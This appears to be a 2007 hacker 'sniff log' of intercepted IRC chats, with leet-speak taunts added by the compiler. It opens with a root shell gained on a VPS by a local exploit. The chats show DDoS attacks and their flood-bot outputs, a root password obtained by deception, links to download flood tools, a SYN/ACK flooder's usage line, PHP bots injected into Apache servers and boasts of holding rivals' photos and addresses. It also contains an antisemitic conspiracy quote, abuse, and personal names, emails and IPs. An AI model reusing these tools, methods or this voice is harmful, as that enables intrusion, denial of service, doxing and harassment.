-bash: /dev/null: Permission denied
-bash: /dev/null: Permission denied
-bash: /dev/null: Permission denied
-bash: /dev/null: Permission denied
+-(serh@identix)
+-(~)-> uname -a
Linux identix 2.6.8-022stab078.10-smp #1 SMP Wed Jun 21 12:11:05 MSD 2006 i686 i686 i386 GNU/Linux
+-(serh@identix)
+-(~)-> ls
psyBNC-2.3.2-7.tar.gz  psyBNC-2.3.2-7.tar.gz.1  psybnc

...............
...............
...............

+-(serh@identix)
+-(~)-> ./dump /bin/sh

bash$ id
uid=0(root) gid=0(root) groups=0(root)


  **********************************************************
  ** OH MY GOOOOOOOOOD! GOOD ADMIN! lol!!! lets sniff it! **
  **********************************************************

times later................

*/
	el8 pokemon sniff log
	08-09/2007

 /*


#u-labs: <themar> | serh (phil@sdrawkcab.net)
#u-labs: <themar> | name : User Phil
#u-labs: <themar> | serv : irc.he.net
#u-labs: <themar> yours ?
#u-labs: <themar> its so mush drama
#u-labs: <themar> what you do after you wpn all
#u-labs: <themar> pwn
#u-labs: <themar> all
#u-labs: <themar> see, drama nver ends
#u-labs: <themar> I have ended it
#u-labs: <themar> no
#u-labs: <themar> its just a idiot
#u-labs: <themar> inc want packet any more
#u-labs: <themar> im shure
#u-labs: <themar> if he does, we fuck him up ?
#u-labs: <themar> you will not
#u-labs: <w3b> heh why themar?
#u-labs: <themar> It ends
#u-labs: <themar> right here
#u-labs: <themar> yes
#u-labs: <themar> no more packets, no more jupes
#u-labs: <themar> no more nothin
#u-labs: <themar> lol
#u-labs: <themar> nick have been dronord
#u-labs: <themar> some time ago proble
PRIVMSG: <Serh587> => <themar>: i guess i will
PRIVMSG: <Serh587> => <themar>: stop all this shit
PRIVMSG: <Serh587> => <themar>: heh
PRIVMSG: <themar> => <Serh587>: Do what you want, but drama never ends
PRIVMSG: <themar> => <Serh587>: listen
PRIVMSG: <themar> => <Serh587>: cid is in prison for ddos
PRIVMSG: <Serh587> => <themar>: lool
PRIVMSG: <Serh587> => <themar>: how you know?
PRIVMSG: <themar> => <Serh587>: along with ashley
PRIVMSG: <themar> => <Serh587>: the x owner of foonet
PRIVMSG: <themar> => <Serh587>: aka gige
PRIVMSG: <Serh587> => <themar>: hehe
PRIVMSG: <Serh587> => <themar>: do you join undernet?
PRIVMSG: <Serh587> => <themar>: i gotta
PRIVMSG: <Serh587> => <themar>: get a new vps
PRIVMSG: <Serh587> => <themar>: from gige
PRIVMSG: <themar> => <Serh587>: juppp
PRIVMSG: <Serh587> => <themar>: say10
PRIVMSG: <Serh587> => <themar>: heh
PRIVMSG: <Serh587> => <themar>: will not
PRIVMSG: <Serh587> => <themar>: sell shit
PRIVMSG: <Serh587> => <themar>: to me
PRIVMSG: <Serh587> => <themar>: i ordred one
PRIVMSG: <Serh587> => <themar>: to vps.cbras.com
PRIVMSG: <themar> => <Serh587>: ryan1918
PRIVMSG: <themar> => <Serh587>: what about him
PRIVMSG: <Serh587> => <themar>: i dunno him
PRIVMSG: <themar> => <Serh587>: whois that
PRIVMSG: <Serh587> => <themar>: dunno
PRIVMSG: <Serh587> => <themar>: :(
PRIVMSG: <Serh587> => <themar>: you got some bots in ur ircd?
PRIVMSG: <themar> => <Serh587>: no
PRIVMSG: <themar> => <Serh587>: its all gone
PRIVMSG: <Serh587> => <themar>: k
PRIVMSG: <themar> => <Serh587>: and my ftp isnt workin
PRIVMSG: <Serh587> => <themar>: :( ic
PRIVMSG: <themar> => <Serh587>: i have to download a new one
PRIVMSG: <themar> => <Serh587>: and im so fuckin lazy
PRIVMSG: <Serh-> => <themar>: im bored
PRIVMSG: <Serh-> => <themar>: lol
PRIVMSG: <Serh-> => <themar>: heh
PRIVMSG: <themar> => <Serh->: me2
PRIVMSG: <Serh-> => <themar>: my friend
PRIVMSG: <Serh-> => <themar>: told me
PRIVMSG: <Serh-> => <themar>: that include
PRIVMSG: <Serh-> => <themar>: had choopa's box
PRIVMSG: <Serh-> => <themar>: irc.choopa.com
PRIVMSG: <Serh-> => <themar>: and they are sniffin efnet

// 0h my 90d!! inc1ud3 h4v4h ch00p4 ?!?!?!?! 1 th1nk n07!!!!
// [root@irc ~]# uname -a
// Linux irc.choopa.net 2.6.18-8.el5 #1 SMP Thu Mar 15 19:57:35 EDT 2007 i686 i686 i386 GNU/Linux
// [root@irc ~]#


PRIVMSG: <themar> => <Serh->: qrazy
PRIVMSG: <Serh-> => <themar>: dont you know
PRIVMSG: <Serh-> => <themar>: a good vps ocmpany?
PRIVMSG: <Serh-> => <themar>: on gige
PRIVMSG: <Serh-> => <themar>: ?
#sysadmins: <n0cn0c> coredata: to OU's and shit?
#sysadmins: <samurai_> clustering you need r2 enterprise or datacenter edition.
#sysadmins: <sheppard> samurai_: like when one guy queues up a 200 page print job
#sysadmins: <coredata> yip
#sysadmins: <samurai_> so that's pricey :(
#sysadmins: <n0cn0c> yeep
#sysadmins: <samurai_> sheppard: true.
#sysadmins: <n0cn0c> i only roll enterprise, baby
PRIVMSG: <themar> => <Serh->: nope
PRIVMSG: <themar> => <Serh->: i was told to get one here by a friend
PRIVMSG: <Serh-> => <themar>: k
PRIVMSG: <Serh-> => <themar>: t0xic
PRIVMSG: <Serh-> => <themar>: heh
PRIVMSG: <Fiwarelli> => <Serh->: jupp
PRIVMSG: <Serh-> => <Fiwarelli>: just 5 bux month?
PRIVMSG: <Serh-> => <Fiwarelli>: because i didnt paid for that vps
PRIVMSG: <Fiwarelli> => <Serh->: i payd 25
PRIVMSG: <Serh-> => <Fiwarelli>: i can tell ya how i get my vos
PRIVMSG: <Serh-> => <Fiwarelli>: i ddosd
PRIVMSG: <Serh-> => <Fiwarelli>: all the guyz
PRIVMSG: <Serh-> => <Fiwarelli>: from the chan
PRIVMSG: <Serh-> => <Fiwarelli>: fastsolutions
PRIVMSG: <Serh-> => <Fiwarelli>: and a jerk came in
PRIVMSG: <Serh-> => <Fiwarelli>: he said he needs help
PRIVMSG: <Serh-> => <Fiwarelli>: because
PRIVMSG: <Serh-> => <Fiwarelli>: his vps
PRIVMSG: <Serh-> => <Fiwarelli>: doesnt work
PRIVMSG: <Serh-> => <Fiwarelli>: i told him to give me the root pass
PRIVMSG: <Serh-> => <Fiwarelli>: lol
PRIVMSG: <Serh-> => <Fiwarelli>: and i ripped it
PRIVMSG: <Fiwarelli> => <Serh->: hahaha
PRIVMSG: <Serh-> => <Fiwarelli>: datz how i get that
PRIVMSG: <Serh-> => <Fiwarelli>: lo
PRIVMSG: <Serh-> => <Fiwarelli>: l
#Fast-Solutions: <Serh-> ACTION slaps _say10 around a bit with a large trout
PRIVMSG: <Serh-> => <Fiwarelli>: that sucker say10
PRIVMSG: <Serh-> => <Fiwarelli>: si around?
PRIVMSG: <Fiwarelli> => <Serh->: idono
#venetia: <Bitza\> ACTION brb la dush
PRIVMSG: <Fiwarelli> => <Serh->: [10:30pm] *** W3bs (~W3bs@ti511110a080-2760.bb.online.no) has joined #null
#arkansas: <ColdStar> Good evening.
#arkansas: <ColdStar> brb
#Albania: <ILIR> PERSHENDETJE GJITHE SHQIPETAREVE
#Albania: <ILIR> a ka njeri zgjuar apo jeni te gjithe ne gjume
#coma: <sike> yo
#coma: <_coma> whatup
#venetia: <Bitza`> ACTION back
#u-labs: <themar> serh
#u-labs: <themar> lets grab your nick
#u-labs: <themar> tnx
#u-labs: <S3rh-> np man
#u-labs: <themar> look at this serh
#u-labs: <S3rh-> yea
#u-labs: <S3rh-> show me
#u-labs: <S3rh-> heh
#u-labs: <S3rh-> boo
#u-labs: <dinamic> hi dude
#u-labs: <dinamic> im going to work
#u-labs: <dinamic> see ya
#u-labs: <S3rh-> see ya
#u-labs: <lippe> heya
#u-labs: <S3r7> heye afriend
#u-labs: <S3r7> sup?
#u-labs: <lippe> my big friend
#u-labs: <lippe> fine, thanks! :)
#u-labs: <S3r7> hehe
#u-labs: <lippe> and you?
#u-labs: <S3r7> i'm fine too thanks;)
#u-labs: <themar> does Felippe de Meirelles Motta, meen, Felippe your pensis sucks ?
#u-labs: <lippe> hahaha
#u-labs: <lippe> learn to get whois ?
#u-labs: <S3r7> lool themar
#u-labs: <themar> I dont get whoois
#u-labs: <lippe> omg, btw who are you themar ?
#u-labs: <themar> IM new
#u-labs: <themar> here
#u-labs: <themar> Im a total idiot
#u-labs: <themar> with no skills at all
#u-labs: <themar> what so ever
#u-labs: <lippe> hehehe, welcome then! :)
#u-labs: <themar> Ntx
#u-labs: <S3r7> zback
#coma: <sike> yoyo
#coma: <_coma> sup man. i just got home.
#coma: <_coma> about to cook some shit up
#coma: <_coma> starving. heh
#coma: <sike> word
#coma: <sike> im wicked stoned
#u-labs: <dinamic> sup
#u-labs: <dactily> ;)
#coma: <sike> yo
#u-labs: <dactily> XgeN ;)
#u-labs: <themar> I have been sleepin for 12 houres
#u-labs: <themar> xDD
#u-labs: <themar> Im fuckin not tired no moree
#venetia: <[Orpen]> ACTION is away (4A7way4! 1Back Later  )
#Albania: <linndy> tung
#Albania: <linndy> ...
#venetia: <Bitza`> ACTION neatza
#u-labs: <themar> ""Jewish people are KHAZARS for the most part with negroid DNA. Jew is NOT synonymous with biblical israelite.Not all jews are khazars-some
are most likely israelites? akin to their european brethren worldwide.The Israel government is run by CORRUPT Zionist khazars who have infiltrated every gove
rnment worldwide trying to implement a supremacist NWO.""
#u-labs: <themar> what to do ?
#u-labs: <themar> serh
#u-labs: <underwave> sup
#u-labs: <S3r7> Nm
#u-labs: <S3r7> chillin
#u-labs: <S3r7> what about you
#u-labs: <S3r7> ?
#u-labs: <S3r7> lol
#u-labs: <S3r7> nice vhost
#u-labs: <S3r7> haha
#u-labs: <underwave> lol
#u-labs: <S3r7> you bought it?
#u-labs: <underwave> nope
#u-labs: <underwave> i made
#u-labs: <underwave> ./whois b33r
#u-labs: <underwave> its mine too
#u-labs: <S3r7> hehe cool
#u-labs: <S3r7> into ur box?
#u-labs: <underwave> some planets
#u-labs: <underwave> =]
#u-labs: <S3r7> cool
#u-labs: <underwave> resolve my dns
#u-labs: <S3r7> i need a vhost like this
#u-labs: <S3r7> yea
#u-labs: <S3r7> its ipv6
#u-labs: <underwave> labsec.us box
#u-labs: <S3r7> hehe
#u-labs: <S3r7> hehe
#u-labs: <S3r7> you owned tht?
#u-labs: <underwave> ./dns labsec.got.strangled.net
#u-labs: <underwave> [DNS] Looking up labsec.got.strangled.net...
#u-labs: <underwave> [DNS] Canonical: labsec.got.strangled.net Numerical: 77.232.81.37
#u-labs: <S3r7> Yea
#u-labs: <underwave> [DNS] Looking up labsec.us...
#u-labs: <underwave> [DNS] Canonical: labsec.us Numerical: 77.232.81.37
#u-labs: <S3r7> * Dns resolved labsec.got.strangled.net to 77.232.81.37
#u-labs: <S3r7> cool]
#u-labs: <S3r7> nice mate
#u-labs: <S3r7> i will buy a gige shell
#u-labs: <S3r7> and join back
#u-labs: <S3r7> in some channs
#u-labs: <S3r7> heh
#u-labs: <S3r7> i wanna see some labsec reactions
#u-labs: <S3r7> heh
#u-labs: <S3r7> you juped klux's nick?
#u-labs: <underwave> nope
#u-labs: <S3r7> Mega_
#u-labs: <underwave> dtr juped klux nick
#u-labs: <S3r7> is oyu?
#u-labs: <S3r7> yea
#u-labs: <S3r7> but mega is you?
#u-labs: <S3r7> MEGA_
#u-labs: <S3r7> MeGa_
#u-labs: <S3r7> its you?
#u-labs: <S3r7> HEH
#u-labs: <S3r7> you can keep
#u-labs: <S3r7> it if is you
#u-labs: <S3r7> if its you
#u-labs: <S3r7> but i thought is the real mega
#u-labs: <S3r7> and shit
#u-labs: <S3r7> heh labsec.got.strangled
#u-labs: <S3r7> lol
#u-labs: <S3r7> nice
#u-labs: <S3r7> haha
#coma: <sike> yo
#u-labs: <underwave> who is jhood?
#u-labs: <S3r7> me
#u-labs: <S3r7> heh
#u-labs: <S3r7> spyinG #NULL chan
#u-labs: <underwave> ssh labsec.got.strangled.net -l root
#u-labs: <underwave> root@labsec.got.strangled.net's password:
#u-labs: <underwave> > id
#u-labs: <underwave> uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

// 0h my g0d 494in!!!!!!!!!!!!!!!!!!!
// l4b53c 0wn3d ?!?!?!?!? 7h15 i5 r3411y n3w!!!!!!! 101111111111111111111!!!

#u-labs: <S3r7> hehe
#u-labs: <S3r7> nive:)
#u-labs: <S3r7> Nice
#u-labs: <S3r7> labsec = dead

// l37'5 90 c0rr3c7 s3r7............................................
//
// labsec && serh = dead

#u-labs: <underwave> lol
#u-labs: <Serh`> it camed back
#u-labs: <Serh`> lol
#u-labs: <underwave> u lost ur nickw
#u-labs: <Serh`> lol
#u-labs: <underwave> ?
#u-labs: <Serh`> nno
#u-labs: <Serh`> nop
#u-labs: <Serh`> datz a friend
#u-labs: <underwave> fuck dude u got 1000 serhs nicks
#u-labs: <Serh`> but they all think
#u-labs: <Serh`> that they
#u-labs: <underwave> this is fear?
#u-labs: <Serh`> that he
#u-labs: <Serh`> juped my nickname
#u-labs: <Serh`> datz why
#u-labs: <Serh`> he keeps it for me
#u-labs: <Serh`> to stop the ddos attacks
#u-labs: <Serh`> for a while
#u-labs: <Serh`> my nick isnt juped
#u-labs: <Serh`> heh

// lolllllllll!!! serh havah a solution to jupe nicknames... 
// 
// +-(serh@identix)
// +-(~)-> killall -9 psybnc
// +-(~)->
//
// * Serh` has quit IRC (Connection reset by peer)
// * S3r7  has quit IRC (Connection reset by peer)
//
// ""Ops! I did'nt again!"" (Britney Spears)


#u-labs: <underwave> what means
#u-labs: <underwave> saq
#u-labs: <underwave> ?
#u-labs: <underwave> serh against quotes?
#u-labs: <underwave> lol
#u-labs: <underwave> =]
#u-labs: <Serh`> lool
#u-labs: <Serh`> hah
#u-labs: <Serh`> dunno
#u-labs: <Serh`> op me
#u-labs: <Serh`> heh
PRIVMSG: <Serh`> => <too>: op me
#u-labs: <underwave> if u are serh
#u-labs: <underwave> what is my another nickname
#u-labs: <Serh`> yea
#u-labs: <underwave> who starts
#u-labs: <underwave> with
#u-labs: <underwave> d
#u-labs: <underwave> =]
#u-labs: <Serh`> dinamic
#u-labs: <Serh`> lol
#u-labs: <Serh`> th
#u-labs: <Serh`> x
#u-labs: <b33r> lol
#u-labs: <Serh`> it's serh
#u-labs: <b33r> like this vhost?
#u-labs: <Serh`> hehe
#u-labs: <Serh`> yea
#u-labs: <Serh`> cool
#u-labs: <Serh`> i like it hehe
#u-labs: <Serh`> brb
#u-labs: <Serh`> i will restart my pc
#coma: <_coma> sup sup
#u-labs: <Serh`> back
#u-labs: <Serh`> :)
#u-labs: <Serh`> back
#u-labs: <Serh`> heh
#u-labs: <Serh`> i must restart my pc
#u-labs: <Serh`> * dexa__ was kicked by uniq (banned)
#u-labs: <Serh`> <[-Craig-]> o.0
#u-labs: <Serh`> <include-> lol
#u-labs: <Serh`> <include-> what happened with dexa
#u-labs: <Serh`> <include-> lol
#u-labs: <Serh`> <include-> what happened with dexa
#u-labs: <Serh`> <[-Craig-]> o.0
#u-labs: <Serh`> <include-> lol
#u-labs: <Serh`> <include-> what happened with dexa
#u-labs: <Serh`> include- appeared
#u-labs: <Serh`> haha
#u-labs: <Serh`> the dark man
#u-labs: <Serh`> include
#u-labs: <Serh`> hahaha
#u-labs: <Serh`> the dark man
#u-labs: <Serh`> include
#u-labs: <Serh`> hahaha
#u-labs: <Serh`> haha
#u-labs: <Serh`> the dark man
#u-labs: <Serh`> include
#u-labs: <Serh`> hahaha

// until serh it jeers include! l0l
// ................................


#u-labs: <XgeN> what is dexa?
#u-labs: <Serh`> a guy
#u-labs: <XgeN> tear
#u-labs: <XgeN> ?
#u-labs: <Serh`> i dunno who is him
#u-labs: <Serh`> i dont know
#u-labs: <Serh`> that guy
#u-labs: <XgeN> nn
#u-labs: <XgeN> mm
#u-labs: <Serh`> xbugs seems around
#u-labs: <Serh`> * include- has joined #blackhats
#u-labs: <Serh`> hhh
#coma: <sike> wut up
#intruders: <Serh`> thanks bro
#u-labs: <m1p> serh
#u-labs: <m1p> u have fighted
#u-labs: <m1p> with
#u-labs: <m1p> fiwarelli?
#u-labs: <Serh`> naa
#u-labs: <Serh`> lol
#u-labs: <Serh`> with alchy
#u-labs: <Serh`> na
#u-labs: <Serh`> i havent fighted with fiwarelli
#u-labs: <XgeN> fiwarelli good friend
#u-labs: <XgeN> old
#u-labs: <Serh`> heh eye
#u-labs: <XgeN> o/
#u-labs: <Serh`> yea
#u-labs: <XgeN> #incest
#u-labs: <Serh`> fiwarelli is a great guy
#u-labs: <XgeN> yes
#u-labs: <Serh`> include-
#u-labs: <Serh`> is on
#u-labs: <Serh`> haha
#u-labs: <XgeN> sk0tch
#u-labs: <XgeN> oi
#u-labs: <Serh`> look in blackhats
#u-labs: <skotch> incest
#u-labs: <Serh`> haha
#u-labs: <XgeN> heh
#u-labs: <XgeN> eh do meu amigo
#u-labs: <XgeN> tem xpl pra
#u-labs: <XgeN> 2.6.12-9-386 #1 Mon Oct 10 13:14:36 BST 2005 i686 GNU/Linux
#u-labs: <XgeN> W2M
#u-labs: <XgeN> firewalli
#u-labs: <XgeN> tinha op la
#u-labs: <XgeN> dai falaram ke iam da gline em todos do canal
#u-labs: <XgeN> dai vazei
#u-labs: <XgeN> :S

// 0h xgen you really know about!!! requer!!!

#intruders: <Pagefault> my wellcome
#u-labs: <XgeN> #portugal
#u-labs: <XgeN> pra quem quiser
#u-labs: <themar> include is goin down
#u-labs: <themar> then is finishd
#u-labs: <themar> what do you guys think
#u-labs: <Serh`> include is peacefull
#u-labs: <themar> You want to let him go
#u-labs: <themar> what about bugsb
#u-labs: <Serh`> no
#u-labs: <Serh`> fuck him
#u-labs: <Serh`> i will never
#u-labs: <Serh`> let him go
#u-labs: <ASSHO1e> lol
#u-labs: <ASSHO1e> let him burn in HELL
#u-labs: <Serh`> haha
#u-labs: <Serh`> oh yea
#u-labs: <ASSHO1e> serh for king !!!
#u-labs: <Serh`> include- was a son of a bitch
#u-labs: <Serh`> hehe :)
#u-labs: <ASSHO1e> he is fuckin crystal meth
#u-labs: <ASSHO1e> hoe
#u-labs: <ASSHO1e> let him die
#u-labs: <themar> But when include is ownd
#u-labs: <themar> do we wayt
#u-labs: <themar> or do we make it bublic
#u-labs: <ASSHO1e> public ?
#u-labs: <ASSHO1e> fuck public
#u-labs: <themar> Let him know that hes owd
#u-labs: <ASSHO1e> :P
#u-labs: <XgeN> any here like include?
#u-labs: <Serh`> na
#u-labs: <ASSHO1e> who u pwned?
#u-labs: <themar> i hate him
#u-labs: <Serh`> nobody in here
#u-labs: <Serh`> likes include
#u-labs: <themar> my friend warchild hates him
#u-labs: <Serh`> include
#u-labs: <Serh`> lol
#u-labs: <themar> infact
#u-labs: <Serh`> lsc team
#u-labs: <themar> All my friends want to see him hurt
#u-labs: <ASSHO1e> lol :P
#u-labs: <themar> badly
#u-labs: <ASSHO1e> lol :P
#u-labs: <themar> badly
#u-labs: <ASSHO1e> lol
#u-labs: <ASSHO1e> eheeh
#u-labs: <themar> mebe bratty sucks up to him
#u-labs: <themar> idono
#u-labs: <themar> Blowjob for packets
#u-labs: <Serh`> yea
#u-labs: <Serh`> rite
#u-labs: <themar> Idono what it will take to own bratty
#u-labs: <themar> She been ownd so many times
#u-labs: <themar> she doesnt give a fuck
#u-labs: <themar> what about this alchy
#u-labs: <themar> [10:18pm] <@include-> lol
#u-labs: <themar> [10:18pm] <@xon> lol
#u-labs: <themar> [10:18pm] <@include-> who
#u-labs: <themar> [10:19pm] <@alchy> Hlol
#u-labs: <themar> null
#u-labs: <Serh`> hahah
#u-labs: <Serh`> i can see that
#coma: <_coma> not much. replying to emails
#coma: <_coma> going to okc tomorrow
#coma: <_coma> my lil girls both have bdays this month. going to kick it with them. and bring my lil boy back
#coma: <_coma> sup with u
#u-labs: <Serh`> in #NULL
#u-labs: <themar> IM packetin include-
#u-labs: <Serh`> lool
#u-labs: <XgeN> we need dns amplification shits
#u-labs: <XgeN> any know any have?
#u-labs: <themar> didnt we just get one
#u-labs: <themar> Serh-
#u-labs: <Serh`> dns amplificator?
#u-labs: <themar> who was talkin about it
#u-labs: <themar> I seen et somewhere
#u-labs: <Serh`> i heard they had
#u-labs: <Serh`> a dns amplificator
#u-labs: <Serh`> labsec
#u-labs: <XgeN> yes
#u-labs: <XgeN> synflooders
#u-labs: <themar> yeah
#u-labs: <XgeN> 01,08:04,08)
#u-labs: <XgeN> he use sysn shits.
#u-labs: <themar> yeah, then we have it
#u-labs: <Serh`> heh
#u-labs: <Serh`> lol
#u-labs: <Serh`> how ?
#u-labs: <XgeN> with
#u-labs: <XgeN> root machines
#u-labs: <Serh`> * include- has quit IRC (Read error: Operation timed out)
#u-labs: <themar> wasnt it with bugsb s codes ?
#u-labs: <XgeN> www.arquivosx.xpg.com.br/c4 works
#u-labs: <Serh`> yea
#u-labs: <Serh`> xbugs coded
#u-labs: <Serh`> all the shit for them
#u-labs: <XgeN> www.arquivosx.xpg.com.br/st.bin


// intranet:~/xpl/labsec# ./l
// [L]OTUS I. by LabSec [SYN/ACK Packet flooder]
// Usage: ./l [source] [destination] [bport] [eport] [type] [timeout]
// type [1:SYN, 2:ACK]                       (no default)
//
// ops!!!


#u-labs: <Serh`> hh
#u-labs: <XgeN> lets try?
#u-labs: <XgeN> me and u ?
#u-labs: <themar> XgeM; can we code it into my php bot
#u-labs: <XgeN> maybe i can look the code
#u-labs: <themar> good
#u-labs: <XgeN> 01,08;04,08p
#u-labs: <themar> yeah haha
#u-labs: <themar> no more include-
#u-labs: <XgeN> Serh-
#u-labs: <XgeN> i will join
#u-labs: <XgeN> my eggdrop here
#u-labs: <XgeN> set -k
#u-labs: <Serh`> kk
#u-labs: <Serh`> no
#u-labs: <Serh`> nono
#u-labs: <themar> spybot
#u-labs: <Serh`> m
#u-labs: <Serh`> no
#u-labs: <Serh`> let the key man
#u-labs: <Serh`> fuck eggdrops
#u-labs: <XgeN> [17:41:57] <12XgeN> .+chan #u-labs
#u-labs: <XgeN> [17:41:57] <05(omnipoten> That channel already exists!
#u-labs: <Serh`> fuck em
#u-labs: <Serh`> no need of eggs
#u-labs: <themar> I dont like eggdrops
#u-labs: <themar> they are so unsafe
#u-labs: <XgeN> yes
#u-labs: <themar> I cant sleep at night
#u-labs: <themar> cnt
#u-labs: <themar> sux to
#u-labs: <Serh`> hehe
#u-labs: <Serh`> yea
#u-labs: <themar> took my friend 3 beers to crack that shit
#u-labs: <XgeN> heh
#u-labs: <XgeN> i know
#u-labs: <XgeN> a
#u-labs: <XgeN> guy too
#u-labs: <XgeN> 01,08:04,08p
#u-labs: <XgeN> Luis
#u-labs: <themar> The thing is, there is 3 keys, and they fuckin manage to put them in top of every code they crypt
#u-labs: <themar> lol
#u-labs: <themar> [10:39pm] *** w3b (heil@216.223.56.2) has left IRC (Read error: Connection reset by peer)
#u-labs: <themar> [10:40pm] *** include- (ghost@216.223.56.2) has left IRC (Read error: Operation timed out)
#u-labs: <themar> [10:40pm] *** Departed (~Departed@ool-43563460.dyn.optonline.net) has joined #null
#u-labs: <themar> [10:41pm] *** Departed (~Departed@ool-43563460.dyn.optonline.net) has left IRC (Killed (il-oomon (Spamming is prohibited)))
#u-labs: <themar> [10:40pm] *** Departed (~Departed@ool-43563460.dyn.optonline.net) has joined #null
#u-labs: <themar> [10:41pm] *** Departed (~Departed@ool-43563460.dyn.optonline.net) has left IRC (Killed (il-oomon (Spamming is prohibited)))
#u-labs: <themar> [10:42pm] *** w3b (heil@216.223.56.2) has joined #null

// oh themar u really got the power!!! power puff girls??? suck my dick!

#u-labs: <themar> wops
#u-labs: <themar> i killd w3b at the same time
#u-labs: <Serh`> heh yea
#u-labs: <Serh`> ye
#u-labs: <themar> That`s fuckin DUAL NICE
#u-labs: <Serh`> theyre using the same ip
#u-labs: <XgeN> gegeg
#u-labs: <Serh`> they're poor nice
#u-labs: <themar> grab hes nick again
#u-labs: <Serh`> they're poor now
#u-labs: <themar> ill drop it 0 0
#u-labs: <Serh`> na
#u-labs: <Serh`> fuck him
#u-labs: <Serh`> later
#u-labs: <Serh`> i dont want them
#u-labs: <themar> kk
#u-labs: <Serh`> to start ddos and shit
#u-labs: <Serh`> heh

// ohh!! serh got the power too!!!!!!!! lets kill psybnc again!!
//
// +-(serh@identix)
// +-(~)-> killall -9 psybnc
// +-(~)->
//
// * Serh` has quit IRC (Connection reset by peer)
// * S3r7  has quit IRC (Connection reset by peer)
//
// ""Ops! I did'nt again!"" (Britney Spears)

#u-labs: <themar> they dont have that much left
#u-labs: <Serh`> yea i know
#u-labs: <themar> thei didnt manage to drop james
#u-labs: <themar> when i juped it on my box
#u-labs: <Serh`> hehe yea
#u-labs: <XgeN> i can take off gige.
#u-labs: <XgeN> but now no
#u-labs: <XgeN> 01,08=04,08/
#u-labs: <XgeN> fucking shit machine off
#u-labs: <themar> I want to jupe include on my box
#u-labs: <themar> to see what say10 does to it
#u-labs: <themar> after
#u-labs: <Serh`> hhh
#u-labs: <Serh`> he will scream
#u-labs: <Serh`> lol
#u-labs: <Serh`> if he deleted mine
#u-labs: <Serh`> he sux
#u-labs: <themar> mebe so, i want to see what he does
#u-labs: <themar> anyways
#u-labs: <Serh`> he is in null channel
#u-labs: <Serh`> i guess someone invited him
#u-labs: <Serh`> to tlak about how i get that vps there
#u-labs: <themar> lol
#u-labs: <themar> that sever w3b`s got
#u-labs: <themar> cant handle shit
#u-labs: <themar> [10:46pm] <[A]drain84991264> [udpflood]: Flood konklusjon: 19501 MB er svidd av / i gjennomsnitt: 975 MB/s
#u-labs: <themar> [10:46pm] <[A]drain32406365> [udpflood]: Flood konklusjon: 18972 MB er svidd av / i gjennomsnitt: 949 MB/s
#u-labs: <themar> [10:46pm] <[A]drain25613014> [udpflood]: Flood konklusjon: 5061 MB er svidd av / i gjennomsnitt: 253 MB/s
#u-labs: <themar> [10:46pm] <[A]drain21332200> [udpflood]: Flood konklusjon: 5117 MB er svidd av / i gjennomsnitt: 256 MB/s
#u-labs: <themar> [10:46pm] <[A]drain00294130> [udpflood]: Flood konklusjon: 5051 MB er svidd av / i gjennomsnitt: 253 MB/s
#u-labs: <themar> [10:46pm] <[A]drain03106044> [udpflood]: Flood konklusjon: 5047 MB er svidd av / i gjennomsnitt: 252 MB/s
#u-labs: <themar> [10:46pm] <[A]drain00294130> [udpflood]: Flood konklusjon: 5051 MB er svidd av / i gjennomsnitt: 253 MB/s
#u-labs: <themar> [10:46pm] <[A]drain03106044> [udpflood]: Flood konklusjon: 5047 MB er svidd av / i gjennomsnitt: 252 MB/s
#u-labs: <themar> [10:46pm] <[A]drain12053506> [udpflood]: Flood konklusjon: 5599 MB er svidd av / i gjennomsnitt: 280 MB/s

// oh my god!! flood ??? 

#u-labs: <Serh`> hehe yea
#u-labs: <Serh`> sux
#u-labs: <Serh`> all they got
#u-labs: <Serh`> is a gige vps
#u-labs: <Serh`> datz how
#u-labs: <themar> 3gb/ps
#u-labs: <Serh`> they still keep
#u-labs: <themar> and hes gone
#u-labs: <Serh`> their nicknames
#u-labs: <Serh`> ye
#u-labs: <themar> 7 bots 3 gb/ps
#u-labs: <themar> thats good
#u-labs: <XgeN> kaiten ?
#u-labs: <themar> No
#u-labs: <themar> php bots
#u-labs: <Serh`> mrinc = include
#u-labs: <XgeN> mm
#u-labs: <Serh`> looooooooooooooooooooool
#u-labs: <themar> injected on to apaches
#u-labs: <XgeN> good
#u-labs: <Serh`> ./whois mrinc
#u-labs: <Serh`> haha
#u-labs: <XgeN> hehe
#u-labs: <XgeN> DELTA
#u-labs: <XgeN> old machines
#u-labs: <themar> hahaha
#u-labs: <themar> thats the same ident
#u-labs: <themar> lol
#u-labs: <Serh`> it;s hix box
#u-labs: <Serh`> i recognize the ip
#u-labs: <XgeN> yes
#u-labs: <XgeN> i know too
#u-labs: <themar> 0 root it
#u-labs: <themar> fast
#u-labs: <XgeN> i have
#u-labs: <XgeN> the photos
#u-labs: <XgeN> and the adress
#u-labs: <XgeN> of all labsec
#u-labs: <XgeN> 01,08:04,08)
#u-labs: <XgeN> ugly nerd boys
#u-labs: <XgeN> 01,08:04,08)

// this is really nerds xgen!! but and u ?

#u-labs: <themar> haha
#u-labs: <themar> IM cute
#u-labs: <themar> thenk good
#u-labs: <themar> If id look anythin like say query
#u-labs: <themar> Id shoot my self
#u-labs: <Serh`> HEHE
#u-labs: <XgeN> haha
#u-labs: <XgeN> me manda o
#u-labs: <XgeN> dns lotus la
#u-labs: <XgeN> pra eu ver?
#u-labs: <XgeN> ou nem rola ?

// xgen; idiots questions 0 tolerance!!!

#venetia: <Bitza`> ACTION eu mam tirat vb cand vin
#u-labs: <themar> part atack
#u-labs: <XgeN> ?
#u-labs: <XgeN> why u have parted
#u-labs: <XgeN> from the chanbnel?
#u-labs: <themar> It was by mistake
#u-labs: <themar> IM so sorry
#u-labs: <themar> lol
#u-labs: <themar> I ment just to part null, chat and i dont remember that other one
#u-labs: <themar> OM i forgiven ?
#u-labs: <themar> This is a tinyer channel
#u-labs: <themar> Its more enjoyable
#u-labs: <themar> pleasant even
#u-labs: <themar> ASSHO1e (gh3tt0
#u-labs: <themar> sup
#u-labs: <ASSHO1e> yo
#u-labs: <ASSHO1e> still smokin some weed
#u-labs: <ASSHO1e> and u
#coma: <sike> gettin ready for key largo :D
#coma: <sike> we leave tonight
#venetia: <Bitza`> ACTION mai e careva ?
#coma: <_coma> still there?
#coma: <_coma> you should be on the road if so. heh
#u-labs: <themar> same
#u-labs: <themar> got to go to work
#u-labs: <themar> AGAIN
#u-labs: <themar> Openin the shop 1 hour to urly
#u-labs: <themar> Quz of some .pl dudes
#u-labs: <lippe> tks
#u-labs: <Serh`> np:)
#intruders: <query> strange
#intruders: <query> :D
